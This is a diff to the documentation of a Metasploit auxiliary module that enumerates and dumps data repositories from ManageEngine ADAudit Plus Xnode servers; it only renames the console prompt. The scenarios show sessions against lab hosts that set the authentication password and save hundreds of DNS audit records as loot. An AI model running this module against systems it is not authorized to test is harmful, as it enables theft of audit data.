@@ -77,7 +77,7 @@ Dump all data from the available data repositories (tables). If true, CONFIG_FIL
 ## Scenarios
 ### ManageEngine ADAudit Plus 6.0.3 (6031) running on Windows Server 2012 R2
 ```
-msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > options
+msf auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > options
 
 Module options (auxiliary/gather/manageengine_adaudit_plus_xnode_enum):
 
@@ -91,7 +91,7 @@ Module options (auxiliary/gather/manageengine_adaudit_plus_xnode_enum):
    RPORT        29118                                                          yes       The target port (TCP)
    USERNAME     atom                                                           yes       Username used to authenticate to the Xnode server
 
-msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > run
+msf auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > run
 [*] Running module against 192.168.1.41
 
 [*] 192.168.1.41:29118 - Running automatic check ("set AutoCheck false" to disable)
@@ -110,12 +110,12 @@ msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > run
 
 ### ManageEngine ADAudit Plus 6.0.7 (6076) running on Windows Server 2019 (custom password)
 ```
-msf6 > use auxiliary/gather/manageengine_adaudit_plus_xnode_enum
-msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > set rhosts 192.168.1.25
+msf > use auxiliary/gather/manageengine_adaudit_plus_xnode_enum
+msf auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > set rhosts 192.168.1.25
 rhosts => 192.168.1.25
-msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > set password custom_password
+msf auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > set password custom_password
 password => custom_password
-msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > options
+msf auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > options
 
 Module options (auxiliary/gather/manageengine_adaudit_plus_xnode_enum):
 
@@ -129,7 +129,7 @@ Module options (auxiliary/gather/manageengine_adaudit_plus_xnode_enum):
    RPORT        29118                                                                                                           yes       The target port (TCP)
    USERNAME     atom                                                                                                            yes       Username used to authenticate to the Xnode server
 
-msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > run
+msf auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > run
 
 [*] Running module against 192.168.1.25
 
@@ -152,5 +152,5 @@ msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) > run
 [*] 192.168.1.25:29118 - Processed 75 queries (max 10 records per query) so far. The last queried record ID was 750. The max ID is 926...
 [+] 192.168.1.25:29118 - Saving 722 records from the AdapDNSAuditLog data repository to /root/.msf4/loot/20220610073754_default_192.168.1.25_xnode_dnsaudit_775121.json
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/manageengine_adaudit_plus_xnode_enum) >
+msf auxiliary(gather/manageengine_adaudit_plus_xnode_enum) >
 ```
